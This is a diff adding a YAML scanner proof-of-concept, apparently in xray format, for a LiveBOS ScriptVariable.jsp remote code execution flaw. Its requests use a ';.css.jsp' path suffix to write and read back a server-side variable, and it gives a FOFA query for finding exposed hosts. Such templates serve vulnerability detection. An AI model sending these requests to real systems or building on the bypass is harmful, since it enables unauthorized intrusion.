@@ -1,0 +1,22 @@
+id: poc-yaml-livebos-scriptvariable-jsp-rce
+info:
+  name: LiveBOS ScriptVariable.jsp 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: LiveBOS
+  fofa: body="LiveBos"
+variables:
+  t1: md5(random_int(100,10000))
+requests:
+- method: POST
+  path: /plug-in/common/ScriptVariable.jsp;.css.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: act=put&scope=0&name=gName13&value={{.t1}}
+  expression: status_code == 200 && contains(body,"<result>true</result>")
+- method: GET
+  path: /plug-in/common/ScriptVariable.jsp;.css.jsp?act=get&scope=0&name=gName13
+  expression: status_code == 200 && contains(body,t1) && contains(body,"true")
+transport: http
